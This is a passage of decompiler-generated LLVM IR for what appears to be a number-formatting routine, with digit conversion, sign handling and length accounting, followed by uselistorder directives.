  %storemerge27.in = phi i32* [ %stack_var_-120, %dec_label_pc_8050077 ], [ %stack_var_-132, %dec_label_pc_8050062 ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge27 = ptrtoint i32* %storemerge27.in to i32
  store i32 %storemerge27, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80500b2

dec_label_pc_8050096:                             ; preds = %dec_label_pc_8050052
  %v4_8050098 = icmp eq i1 %v1_805004e, false
  br i1 %v4_8050098, label %dec_label_pc_80500a3, label %dec_label_pc_805009a

dec_label_pc_805009a:                             ; preds = %dec_label_pc_8050096
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805009d

dec_label_pc_805009d:                             ; preds = %dec_label_pc_8050019, %dec_label_pc_805009a
  %v0_80500e5111 = phi i32 [ %v1_80500a9, %dec_label_pc_8050019 ], [ -1, %dec_label_pc_805009a ]
  %v2_805009d = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_805009d, i32* @ecx, align 4
  br label %dec_label_pc_80500b2

dec_label_pc_80500a3:                             ; preds = %dec_label_pc_8050096
  %v2_80500a7 = add i32 %v1_8050028, %v1_80500a9
  store i32 %v2_80500a7, i32* %edi.global-to-local, align 4
  %v2_80500a9 = sub i32 %v2_805004c, %v1_80500a9
  store i32 %v2_80500a9, i32* %edx.global-to-local, align 4
  %v2_80500ab = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_80500ab, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80500b2

dec_label_pc_80500b2:                             ; preds = %dec_label_pc_805009d, %dec_label_pc_8050092, %dec_label_pc_80500a3
  %v0_80500e5110 = phi i32 [ %v0_80500e5111, %dec_label_pc_805009d ], [ -1, %dec_label_pc_8050092 ], [ -1, %dec_label_pc_80500a3 ]
  %v0_80500ce = phi i32 [ %v2_805009d, %dec_label_pc_805009d ], [ %storemerge27, %dec_label_pc_8050092 ], [ %v2_80500ab, %dec_label_pc_80500a3 ]
  %v0_80500bf = phi i32 [ %v2_805004c, %dec_label_pc_805009d ], [ 0, %dec_label_pc_8050092 ], [ %v2_80500a9, %dec_label_pc_80500a3 ]
  store i32 %tmp155, i32* %eax.global-to-local, align 4
  %v2_80500b9 = inttoptr i32 %v1_804fd2f to i8*
  %v3_80500b9 = load i8, i8* %v2_80500b9, align 1
  %v4_80500b9 = and i8 %v3_80500b9, 16
  %v5_80500b9 = icmp eq i8 %v4_80500b9, 0
  %v1_80500bd = icmp eq i1 %v5_80500b9, false
  br i1 %v1_80500bd, label %dec_label_pc_80500ce, label %dec_label_pc_80500bf

dec_label_pc_80500bf:                             ; preds = %dec_label_pc_80500b2
  %v1_80500bf = icmp eq i32 %v0_80500bf, 0
  %v1_80500c1 = icmp eq i1 %v1_80500bf, false
  br i1 %v1_80500c1, label %dec_label_pc_80500ce, label %dec_label_pc_80500c3

dec_label_pc_80500c3:                             ; preds = %dec_label_pc_80500bf
  br i1 %v12_804ff27, label %dec_label_pc_80500e5, label %dec_label_pc_80500ca

dec_label_pc_80500ca:                             ; preds = %dec_label_pc_80500c3
  %v0_80500ca = load i32, i32* %ebp.global-to-local, align 4
  %tmp188 = icmp slt i32 %v0_80500ca, 1
  br i1 %tmp188, label %dec_label_pc_80500e5, label %dec_label_pc_80500ce

dec_label_pc_80500ce:                             ; preds = %dec_label_pc_80500ca, %dec_label_pc_80500bf, %dec_label_pc_80500b2
  %v1_80500ce = inttoptr i32 %v0_80500ce to i32*
  store i32 112, i32* %v1_80500ce, align 4
  %v0_80500d4 = load i32, i32* @ecx, align 4
  %v1_80500d4 = add i32 %v0_80500d4, 4
  %v2_80500d4 = inttoptr i32 %v1_80500d4 to i32*
  store i32 1, i32* %v2_80500d4, align 4
  %v0_80500db = load i32, i32* @ecx, align 4
  %v1_80500db = add i32 %v0_80500db, 8
  %v2_80500db = inttoptr i32 %v1_80500db to i32*
  store i32 ptrtoint (i32* @global_var_80548c0.193 to i32), i32* %v2_80500db, align 4
  %v0_80500e2 = load i32, i32* @ecx, align 4
  %v1_80500e2 = add i32 %v0_80500e2, 12
  store i32 %v1_80500e2, i32* @ecx, align 4
  %v0_80500e5.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80500e5

dec_label_pc_80500e5:                             ; preds = %dec_label_pc_80500ca, %dec_label_pc_80500c3, %dec_label_pc_80500ce
  %v0_80500ec = phi i32 [ %v0_80500ce, %dec_label_pc_80500ca ], [ %v0_80500ce, %dec_label_pc_80500c3 ], [ %v1_80500e2, %dec_label_pc_80500ce ]
  %v0_80500e5 = phi i32 [ %v0_80500e5110, %dec_label_pc_80500ca ], [ %v0_80500e5110, %dec_label_pc_80500c3 ], [ %v0_80500e5.pre, %dec_label_pc_80500ce ]
  %v1_80500e5 = add i32 %v0_80500e5, 1
  %v8_80500e5 = icmp eq i32 %v1_80500e5, 0
  store i32 %v1_80500e5, i32* %ebx.global-to-local, align 4
  br i1 %v8_80500e5, label %dec_label_pc_80500ff, label %dec_label_pc_80500e8

dec_label_pc_80500e8:                             ; preds = %dec_label_pc_80500e5
  %v1_80500ea = sub i32 -1, %v0_80500e5
  store i32 %v1_80500ea, i32* %eax.global-to-local, align 4
  %v1_80500ec = inttoptr i32 %v0_80500ec to i32*
  store i32 176, i32* %v1_80500ec, align 4
  %v0_80500f2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80500f2 = load i32, i32* @ecx, align 4
  %v2_80500f2 = add i32 %v1_80500f2, 4
  %v3_80500f2 = inttoptr i32 %v2_80500f2 to i32*
  store i32 %v0_80500f2, i32* %v3_80500f2, align 4
  %v0_80500f5 = load i32, i32* @ecx, align 4
  %v1_80500f5 = add i32 %v0_80500f5, 8
  %v2_80500f5 = inttoptr i32 %v1_80500f5 to i32*
  store i32 ptrtoint (i32* @global_var_80548b3.192 to i32), i32* %v2_80500f5, align 4
  %v0_80500fc = load i32, i32* @ecx, align 4
  %v1_80500fc = add i32 %v0_80500fc, 12
  store i32 %v1_80500fc, i32* @ecx, align 4
  br label %dec_label_pc_80500ff

dec_label_pc_80500ff:                             ; preds = %dec_label_pc_80500e5, %dec_label_pc_80500e8
  %v0_8050103 = phi i32 [ %v0_80500ec, %dec_label_pc_80500e5 ], [ %v1_80500fc, %dec_label_pc_80500e8 ]
  %v0_80500ff = load i32, i32* %edx.global-to-local, align 4
  %v1_80500ff = icmp eq i32 %v0_80500ff, 0
  br i1 %v1_80500ff, label %dec_label_pc_8050112, label %dec_label_pc_8050103

dec_label_pc_8050103:                             ; preds = %dec_label_pc_80500ff
  %v1_8050103 = inttoptr i32 %v0_8050103 to i32*
  store i32 112, i32* %v1_8050103, align 4
  %v0_8050109 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050109 = load i32, i32* @ecx, align 4
  %v2_8050109 = add i32 %v1_8050109, 4
  %v3_8050109 = inttoptr i32 %v2_8050109 to i32*
  store i32 %v0_8050109, i32* %v3_8050109, align 4
  %v0_805010c = load i32, i32* %edi.global-to-local, align 4
  %v1_805010c = load i32, i32* @ecx, align 4
  %v2_805010c = add i32 %v1_805010c, 8
  %v3_805010c = inttoptr i32 %v2_805010c to i32*
  store i32 %v0_805010c, i32* %v3_805010c, align 4
  %v0_805010f = load i32, i32* @ecx, align 4
  %v1_805010f = add i32 %v0_805010f, 12
  store i32 %v1_805010f, i32* @ecx, align 4
  br label %dec_label_pc_8050112

dec_label_pc_8050112:                             ; preds = %dec_label_pc_80500ff, %dec_label_pc_8050103
  %v0_8050130 = phi i32 [ %v0_8050103, %dec_label_pc_80500ff ], [ %v1_805010f, %dec_label_pc_8050103 ]
  br i1 %v1_804ff2c, label %dec_label_pc_8050126, label %dec_label_pc_8050119

dec_label_pc_8050119:                             ; preds = %dec_label_pc_8050112
  store i32 %tmp155, i32* %eax.global-to-local, align 4
  %v3_8050120 = load i8, i8* %v2_80500b9, align 1
  %v4_8050120 = and i8 %v3_8050120, 16
  %v5_8050120 = icmp eq i8 %v4_8050120, 0
  br i1 %v5_8050120, label %dec_label_pc_8050143, label %dec_label_pc_8050126

dec_label_pc_8050126:                             ; preds = %dec_label_pc_8050119, %dec_label_pc_8050112
  %v0_8050126 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050128 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050128 = sub i32 %v0_8050126, %v1_8050128
  store i32 %v2_8050128, i32* %eax.global-to-local, align 4
  %v1_805012a = load i32, i32* %ebp.global-to-local, align 4
  %v2_805012a = sub i32 %v2_8050128, %v1_805012a
  %v8_805012a = xor i32 %v1_805012a, %v2_8050128
  %v9_805012a = xor i32 %v2_805012a, %v2_8050128
  %v10_805012a = and i32 %v9_805012a, %v8_805012a
  %v11_805012a = icmp slt i32 %v10_805012a, 0
  %v13_805012a = icmp slt i32 %v2_805012a, 0
  %v2_805012c = icmp eq i1 %v13_805012a, %v11_805012a
  br i1 %v2_805012c, label %dec_label_pc_8050143, label %dec_label_pc_805012e

dec_label_pc_805012e:                             ; preds = %dec_label_pc_8050126
  %v2_805012e = sub i32 %v1_805012a, %v2_8050128
  store i32 %v2_805012e, i32* %ebp.global-to-local, align 4
  %v1_8050130 = inttoptr i32 %v0_8050130 to i32*
  store i32 176, i32* %v1_8050130, align 4
  %v0_8050136 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8050136 = load i32, i32* @ecx, align 4
  %v2_8050136 = add i32 %v1_8050136, 4
  %v3_8050136 = inttoptr i32 %v2_8050136 to i32*
  store i32 %v0_8050136, i32* %v3_8050136, align 4
  %v0_8050139 = load i32, i32* @ecx, align 4
  %v1_8050139 = add i32 %v0_8050139, 8
  %v2_8050139 = inttoptr i32 %v1_8050139 to i32*
  store i32 ptrtoint (i32* @global_var_80548b3.192 to i32), i32* %v2_8050139, align 4
  %v0_8050140 = load i32, i32* @ecx, align 4
  %v1_8050140 = add i32 %v0_8050140, 12
  store i32 %v1_8050140, i32* @ecx, align 4
  br label %dec_label_pc_8050143

dec_label_pc_8050143:                             ; preds = %dec_label_pc_8050126, %dec_label_pc_8050119, %dec_label_pc_805012e
  %v1_80501cb120 = phi i32 [ %v0_8050130, %dec_label_pc_8050126 ], [ %v0_8050130, %dec_label_pc_8050119 ], [ %v1_8050140, %dec_label_pc_805012e ]
  %v12_8050143 = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_8050143, label %dec_label_pc_80501be, label %dec_label_pc_805014a

dec_label_pc_805014a:                             ; preds = %dec_label_pc_8050143
  %v5_805014a = load i32, i32* %edx.global-to-local, align 4
  %v6_805014a = and i32 %v5_805014a, -256
  %v7_805014a = or i32 %v6_805014a, %stack_var_-42.0
  store i32 %v7_805014a, i32* %edx.global-to-local, align 4
  %v0_8050151 = load i32, i32* %esi.global-to-local, align 4
  %v2_8050151 = icmp slt i32 %v0_8050151, 0
  %v1_8050153 = trunc i32 %stack_var_-42.0 to i8
  br i1 %v2_8050151, label %dec_label_pc_8050162, label %dec_label_pc_805016b

dec_label_pc_8050162:                             ; preds = %dec_label_pc_805014a
  store i32 %v0_8050151, i32* %edx.global-to-local, align 4
  %v1_8050164 = sub i32 0, %v0_8050151
  br label %dec_label_pc_805016b

dec_label_pc_805016b:                             ; preds = %dec_label_pc_805014a, %dec_label_pc_8050162
  %storemerge26 = phi i32 [ %v1_8050164, %dec_label_pc_8050162 ], [ %v0_8050151, %dec_label_pc_805014a ]
  %storemerge8 = phi i8 [ 45, %dec_label_pc_8050162 ], [ 43, %dec_label_pc_805014a ]
  store i32 %storemerge26, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-27, align 4
  %v2_8050173 = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_8050173, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805017f

dec_label_pc_805017f:                             ; preds = %dec_label_pc_805017f.backedge, %dec_label_pc_805016b
  %v0_805018a = phi i32 [ %v0_805018a.pre, %dec_label_pc_805017f.backedge ], [ %v2_8050173, %dec_label_pc_805016b ]
  %v0_8050187 = phi i32 [ %v0_8050187.pre, %dec_label_pc_805017f.backedge ], [ 2, %dec_label_pc_805016b ]
  %v0_805017f = phi i32 [ %v9_8050188, %dec_label_pc_805017f.backedge ], [ %storemerge26, %dec_label_pc_805016b ]
  %v1_8050186 = ashr i32 %v0_805017f, 31
  %v1_8050187 = add i32 %v0_8050187, 1
  store i32 %v1_8050187, i32* %edi.global-to-local, align 4
  %v2_8050188 = zext i32 %v0_805017f to i64
  %v4_8050188 = zext i32 %v1_8050186 to i64
  %v5_8050188 = mul nuw i64 %v4_8050188, 4294967296
  %v6_8050188 = or i64 %v5_8050188, %v2_8050188
  %v8_8050188 = sdiv i64 %v6_8050188, 10
  %v9_8050188 = trunc i64 %v8_8050188 to i32
  %v10_8050188 = srem i64 %v6_8050188, 10
  %v1_805018a = add i32 %v0_805018a, -1
  store i32 %v1_805018a, i32* %ebx.global-to-local, align 4
  store i32 %v9_8050188, i32* %esi.global-to-local, align 4
  %v3_805018d = and i32 %v9_8050188, -256
  %v1_805018f = trunc i64 %v10_8050188 to i8
  %v2_805018f = add i8 %v1_805018f, 48
  %v12_805018f = zext i8 %v2_805018f to i32
  %v15_805018f = or i32 %v12_805018f, %v3_805018d
  store i32 %v15_805018f, i32* %eax.global-to-local, align 4
  %v3_8050194 = inttoptr i32 %v1_805018a to i8*
  store i8 %v2_805018f, i8* %v3_8050194, align 1
  store i32 %v9_8050188, i32* %edx.global-to-local, align 4
  %v7_8050198 = icmp sgt i32 %v1_8050187, 3
  br i1 %v7_8050198, label %dec_label_pc_805019a, label %dec_label_pc_805017f.backedge

dec_label_pc_805019a:                             ; preds = %dec_label_pc_805017f
  %v2_805019a = icmp eq i32 %v9_8050188, 0
  %v1_805019c = icmp eq i1 %v2_805019a, false
  br i1 %v1_805019c, label %dec_label_pc_805017f.backedge, label %dec_label_pc_805019e

dec_label_pc_805017f.backedge:                    ; preds = %dec_label_pc_805019a, %dec_label_pc_805017f
  %v0_8050187.pre = load i32, i32* %edi.global-to-local, align 4
  %v0_805018a.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805017f

dec_label_pc_805019e:                             ; preds = %dec_label_pc_805019a
  %v4_805019e = zext i8 %storemerge8 to i32
  %v7_805019e = or i32 %v3_805018d, %v4_805019e
  store i32 %v7_805019e, i32* %edx.global-to-local, align 4
  %v0_80501a2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80501a2 = add i32 %v0_80501a2, -2
  store i32 %v1_80501a2, i32* %eax.global-to-local, align 4
  %v3_80501a5 = add i32 %v0_80501a2, -1
  %v4_80501a5 = inttoptr i32 %v3_80501a5 to i8*
  store i8 %storemerge8, i8* %v4_80501a5, align 1
  %v5_80501a8 = load i32, i32* %edx.global-to-local, align 4
  %v6_80501a8 = and i32 %v5_80501a8, -256
  %v7_80501a8 = or i32 %v6_80501a8, %stack_var_-42.0
  store i32 %v7_80501a8, i32* %edx.global-to-local, align 4
  %v2_80501ac = load i32, i32* %ebx.global-to-local, align 4
  %v3_80501ac = add i32 %v2_80501ac, -2
  %v4_80501ac = inttoptr i32 %v3_80501ac to i8*
  store i8 %v1_8050153, i8* %v4_80501ac, align 1
  %v0_80501af = load i32, i32* @ecx, align 4
  %v1_80501af = inttoptr i32 %v0_80501af to i32*
  store i32 112, i32* %v1_80501af, align 4
  %v0_80501b5 = load i32, i32* %edi.global-to-local, align 4
  %v1_80501b5 = load i32, i32* @ecx, align 4
  %v2_80501b5 = add i32 %v1_80501b5, 4
  %v3_80501b5 = inttoptr i32 %v2_80501b5 to i32*
  store i32 %v0_80501b5, i32* %v3_80501b5, align 4
  %v0_80501b8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80501b8 = load i32, i32* @ecx, align 4
  %v2_80501b8 = add i32 %v1_80501b8, 8
  %v3_80501b8 = inttoptr i32 %v2_80501b8 to i32*
  store i32 %v0_80501b8, i32* %v3_80501b8, align 4
  %v0_80501bb = load i32, i32* @ecx, align 4
  %v1_80501bb = add i32 %v0_80501bb, 12
  store i32 %v1_80501bb, i32* @ecx, align 4
  br label %dec_label_pc_80501be

dec_label_pc_80501be:                             ; preds = %dec_label_pc_8050143, %dec_label_pc_804fded, %dec_label_pc_805019e
  %v0_805023d = phi i32 [ %v1_80501cb120, %dec_label_pc_8050143 ], [ %v2_804fdf5, %dec_label_pc_804fded ], [ %v1_80501bb, %dec_label_pc_805019e ]
  %v2_80501be = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_80501be, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80501c2

dec_label_pc_80501c2:                             ; preds = %dec_label_pc_80501c2, %dec_label_pc_80501be
  %v0_80501c2 = phi i32 [ %v2_80501be, %dec_label_pc_80501be ], [ %v1_80501c4, %dec_label_pc_80501c2 ]
  %stack_var_-216.0 = phi i32 [ %v3_804fcef, %dec_label_pc_80501be ], [ %v5_80501c7, %dec_label_pc_80501c2 ]
  %v1_80501c2 = inttoptr i32 %v0_80501c2 to i32*
  %v2_80501c2 = load i32, i32* %v1_80501c2, align 4
  store i32 %v2_80501c2, i32* %ebx.global-to-local, align 4
  %v1_80501c4 = add i32 %v0_80501c2, 12
  store i32 %v1_80501c4, i32* %eax.global-to-local, align 4
  %v5_80501c7 = sub i32 %stack_var_-216.0, %v2_80501c2
  %v7_80501cb = icmp ult i32 %v1_80501c4, %v0_805023d
  br i1 %v7_80501cb, label %dec_label_pc_80501c2, label %dec_label_pc_80501cf

dec_label_pc_80501cf:                             ; preds = %dec_label_pc_80501c2
  store i32 %v0_805023d, i32* %esi.global-to-local, align 4
  %v5_80501e2 = icmp eq i8 %stack_var_-26.0, 0
  store i32 160, i32* %stack_var_-168, align 4
  %v1_80501f2 = icmp eq i1 %v5_80501e2, false
  %v2_80501f2 = zext i1 %v1_80501f2 to i32
  store i32 %v2_80501f2, i32* %edx.global-to-local, align 4
  %v2_80501f5 = sub i32 %v5_80501c7, %v2_80501f2
  store i32 %v2_80501f5, i32* %eax.global-to-local, align 4
  %tmp189 = icmp slt i32 %v2_80501f5, 1
  br i1 %tmp189, label %dec_label_pc_805023f, label %dec_label_pc_80501ff

dec_label_pc_80501ff:                             ; preds = %dec_label_pc_80501cf
  store i32 %tmp155, i32* %edx.global-to-local, align 4
  %v2_8050206 = inttoptr i32 %v1_804fd2f to i8*
  %v3_8050206 = load i8, i8* %v2_8050206, align 1
  %v4_8050206 = and i8 %v3_8050206, 8
  %v5_8050206 = icmp eq i8 %v4_8050206, 0
  br i1 %v5_8050206, label %dec_label_pc_8050221, label %dec_label_pc_805020c

dec_label_pc_805020c:                             ; preds = %dec_label_pc_80501ff
  %v1_805020c = add i32 %v0_805023d, 12
  store i32 %v1_805020c, i32* %esi.global-to-local, align 4
  %v1_805020f = inttoptr i32 %v0_805023d to i32*
  store i32 160, i32* %v1_805020f, align 4
  %v1_8050215 = load i32, i32* @ecx, align 4
  %v2_8050215 = add i32 %v1_8050215, 4
  %v3_8050215 = inttoptr i32 %v2_8050215 to i32*
  store i32 %v2_80501f5, i32* %v3_8050215, align 4
  %v0_8050218 = load i32, i32* @ecx, align 4
  %v1_8050218 = add i32 %v0_8050218, 8
  %v2_8050218 = inttoptr i32 %v1_8050218 to i32*
  store i32 ptrtoint (i32* @global_var_80548b3.192 to i32), i32* %v2_8050218, align 4
  br label %dec_label_pc_805023f

dec_label_pc_8050221:                             ; preds = %dec_label_pc_80501ff
  store i32 %tmp155, i32* %ebx.global-to-local, align 4
  %v1_8050228 = add i32 %tmp155, 16
  %v2_8050228 = inttoptr i32 %v1_8050228 to i32*
  %v3_8050228 = load i32, i32* %v2_8050228, align 4
  %v9_8050228 = icmp eq i32 %v3_8050228, 48
  %v1_805022c = icmp eq i1 %v9_8050228, false
  br i1 %v1_805022c, label %dec_label_pc_8050239, label %dec_label_pc_805022e

dec_label_pc_805022e:                             ; preds = %dec_label_pc_8050221
  %v3_805022e = load i32, i32* %stack_var_-152, align 4
  %v5_805022e = add i32 %v3_805022e, %v2_80501f5
  store i32 %v5_805022e, i32* %stack_var_-152, align 4
  br label %dec_label_pc_805023d

dec_label_pc_8050234:                             ; preds = %dec_label_pc_8050245
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805026c

dec_label_pc_8050239:                             ; preds = %dec_label_pc_8050221
  br label %dec_label_pc_805023d

dec_label_pc_805023d:                             ; preds = %dec_label_pc_805022e, %dec_label_pc_8050239
  store i32 %v0_805023d, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805023f

dec_label_pc_805023f:                             ; preds = %dec_label_pc_80501cf, %dec_label_pc_805020c, %dec_label_pc_805023d
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_8050241 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_8050241, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050245

dec_label_pc_8050245:                             ; preds = %dec_label_pc_8050263, %dec_label_pc_805023f
  call void @__pseudo_call(i32 %tmp155)
  %v1_805025e = load i32, i32* %ebx.global-to-local, align 4
  %v2_805025e = add i32 %v1_805025e, 4
  %v3_805025e = inttoptr i32 %v2_805025e to i32*
  %v4_805025e = load i32, i32* %v3_805025e, align 4
  %v15_805025e = icmp eq i32 %v2_80501f5, %v4_805025e
  %v1_8050261 = icmp eq i1 %v15_805025e, false
  br i1 %v1_8050261, label %dec_label_pc_8050234, label %dec_label_pc_8050263

dec_label_pc_8050263:                             ; preds = %dec_label_pc_8050245
  %v1_8050263 = add i32 %v1_805025e, 12
  store i32 %v1_8050263, i32* %ebx.global-to-local, align 4
  %v0_8050266 = load i32, i32* %edi.global-to-local, align 4
  %v2_8050266 = add i32 %v0_8050266, %v2_80501f5
  store i32 %v2_8050266, i32* %edi.global-to-local, align 4
  %v1_8050268 = load i32, i32* %esi.global-to-local, align 4
  %v7_8050268 = icmp ult i32 %v1_8050263, %v1_8050268
  br i1 %v7_8050268, label %dec_label_pc_8050245, label %dec_label_pc_805026c

dec_label_pc_805026c:                             ; preds = %dec_label_pc_8050263, %dec_label_pc_8050234
  %v0_8050272 = phi i32 [ -1, %dec_label_pc_8050234 ], [ %v2_8050266, %dec_label_pc_8050263 ]
  store i32 %v0_8050272, i32* %eax.global-to-local, align 4
  %v2_8050275 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8050275, i32* @esi, align 4
  store i32 %v0_804fcd2, i32* @edi, align 4
  store i32 %v0_804fcd1, i32* @ebp, align 4
  ret i32 %v0_8050272

; uselistorder directives
  uselistorder i32 %v0_8050272, { 1, 0 }
  uselistorder i32 %v2_80501f5, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v2_80501f2, { 1, 0 }
  uselistorder i32 %v1_80501c4, { 1, 2, 0 }
  uselistorder i32 %v0_80501c2, { 1, 0 }
  uselistorder i32 %v0_805023d, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v9_8050188, { 3, 2, 1, 0, 4 }
  uselistorder i8 %storemerge8, { 1, 0 }
  uselistorder i32 %v0_8050151, { 2, 1, 0, 3 }
  uselistorder i32 %v2_805012a, { 1, 0 }
  uselistorder i32 %v1_805012a, { 1, 0, 2 }
  uselistorder i32 %v2_8050128, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_80500e5, { 1, 0 }
  uselistorder i32 %v2_8050052, { 2, 1, 3, 0 }
  uselistorder i32 %v2_805004c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_80500a9, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v1_804ffe8, { 1, 0 }
  uselistorder i32 %v0_804ffe3, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804ffb0, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_804ffab, { 1, 0 }
  uselistorder i8 %v2_804ffa4, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_804ffa4, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-220.3, { 1, 0 }
  uselistorder i32 %v0_804ff2e, { 1, 2, 0 }
  uselistorder i32 %stack_var_-42.0, { 0, 2, 1 }
  uselistorder i8 %stack_var_-207.1, { 4, 3, 1, 5, 0, 2 }
  uselistorder i8 %v4_804ff13, { 1, 0 }
  uselistorder i32 %tmp194, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_804fede, { 1, 0 }
  uselistorder i32 %v2_804fe97, { 2, 1, 0 }
  uselistorder i32 %v0_804ff4d, { 1, 2, 0, 3 }
  uselistorder x86_fp80 %v1_804fe69, { 1, 0 }
  uselistorder x86_fp80 %v3_804fe4b, { 2, 0, 1, 3, 6, 7, 5, 8, 4, 9, 10 }
  uselistorder i32 %v3_804fe48, { 1, 0 }
  uselistorder x86_fp80 %v4_804fe30, { 2, 0, 1, 3, 4 }
  uselistorder x86_fp80 %v3_804fe2a, { 1, 2, 0 }
  uselistorder i32 %v3_804fe27, { 1, 0 }
  uselistorder i32 %v1_804fe20, { 3, 0, 1, 2 }
  uselistorder i32 %stack_var_-220.0, { 2, 0, 1 }
  uselistorder x86_fp80 %v1_804fe59, { 8, 1, 2, 5, 3, 4, 6, 0, 7, 9 }
  uselistorder x86_fp80 %v2_804fe21, { 1, 0 }
  uselistorder i8 %v4_804fdd1, { 1, 0 }
  uselistorder i3 %v1_804fd6e, { 1, 0, 2 }
  uselistorder i8 %stack_var_-207.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
  uselistorder i8 %v3_804fcf6, { 1, 0, 2, 3 }
  uselistorder i32 %v3_804fcef, { 1, 0, 2 }
  uselistorder i3 %v4_804fce8, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp155, { 14, 13, 12, 11, 10, 9, 8, 7, 0, 6, 1, 2, 3, 5, 4 }
  uselistorder x86_fp80 %tmp154, { 3, 2, 1, 0, 4, 5 }
  uselistorder x86_fp80* %st1.global-to-local, { 7, 6, 8, 9, 11, 3, 0, 1, 10, 12, 2, 5, 4 }
  uselistorder x86_fp80* %st0.global-to-local, { 3, 1, 2, 0, 4, 5, 7, 6, 8 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 5, 4, 6, 7, 8, 1, 9, 10, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 10, 0, 1, 11, 12, 5, 3, 4, 2, 6, 7, 8, 9 }
  uselistorder i32* %edx.global-to-local, { 1, 22, 23, 24, 25, 26, 19, 27, 28, 4, 6, 5, 7, 2, 3, 8, 11, 9, 12, 10, 13, 14, 15, 16, 17, 0, 18, 20, 21 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 8, 7, 9, 10, 5, 4, 6 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 20, 22, 23, 21, 24, 25, 26, 27, 28, 29, 4, 17, 5, 6, 7, 8, 12, 13, 9, 10, 11, 14, 15, 16, 18, 19 }
  uselistorder i32* %ebp.global-to-local, { 9, 10, 5, 6, 0, 3, 2, 1, 4, 7, 8 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 2, 3, 4, 5, 6, 21, 22, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i8 43, { 2, 1, 0 }
  uselistorder i8 45, { 1, 2, 0 }
  uselistorder i8 56, { 1, 0 }
  uselistorder i8 102, { 2, 3, 1, 0 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder x86_fp80 0xK401CEE6B280000000000, { 1, 2, 0 }
  uselistorder i32 4096, { 2, 11, 3, 4, 12, 13, 5, 10, 8, 9, 6, 1, 7, 0 }
  uselistorder i32 13, { 0, 4, 3, 1, 2 }
  uselistorder x86_fp80 0xK3FFD8000000000000000, { 1, 0, 2, 3 }
  uselistorder x86_fp80 0xK00000000000000000000, { 0, 2, 3, 4, 1 }
  uselistorder label %dec_label_pc_805023f, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805023d, { 1, 0 }
  uselistorder label %dec_label_pc_80501be, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805016b, { 1, 0 }
  uselistorder label %dec_label_pc_8050143, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050112, { 1, 0 }
  uselistorder label %dec_label_pc_80500ff, { 1, 0 }
  uselistorder label %dec_label_pc_80500e5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80500b2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805009d, { 1, 0 }
  uselistorder label %dec_label_pc_8050092, { 1, 0 }
  uselistorder label %dec_label_pc_8050019, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805000b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ffd1, { 1, 0 }
  uselistorder label %dec_label_pc_804ffa1.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804ff6d, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ff3c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ff27, { 1, 0 }
  uselistorder label %dec_label_pc_804fe93, { 1, 0 }
  uselistorder label %dec_label_pc_804fe6b, { 2, 0, 1 }
